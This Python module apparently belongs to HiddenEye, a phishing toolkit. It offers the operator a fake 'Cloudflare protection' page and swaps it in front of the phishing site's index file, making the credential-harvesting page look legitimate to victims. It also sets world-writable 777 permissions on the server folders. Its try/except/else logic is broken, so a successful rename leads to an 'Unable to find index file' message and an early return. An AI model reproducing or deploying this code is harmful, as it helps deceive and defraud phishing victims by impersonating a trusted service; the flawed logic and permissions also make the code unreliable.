#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


from Defs.ImportManager.unsorted_will_be_replaced import wait, run_command, pathlib_Path, replace, copyfile, chmod
import Defs.ThemeManager.theme as theme

default_palette = theme.default_palette

def add_cloudflare_prompt():

    run_command('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
    print("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(default_palette[0], default_palette[4]))
    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2])).upper()
    if choice == 'Y':
        add_cloudfare()
    else:
        wait(1)


def add_cloudfare():
    #run_command('mv Server/www/index.* Server/www/home.php &
    # & cp WebPages/cloudfare.html Server/www/index.html')
    chmod('Server', 0o777)
    chmod('Server/www', 0o777)
    try:
        replace('Server/www/index.php', 'Server/www/home.php')
    except:
        replace('Server/www/index.html', 'Server/www/home.php')
    else:
        print('Unable to find index file, skipping...')
        return
    copyfile('WebPages/cloudflare.html', 'Server/www/index.html')
    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(default_palette[0], default_palette[4]))
    wait(1)

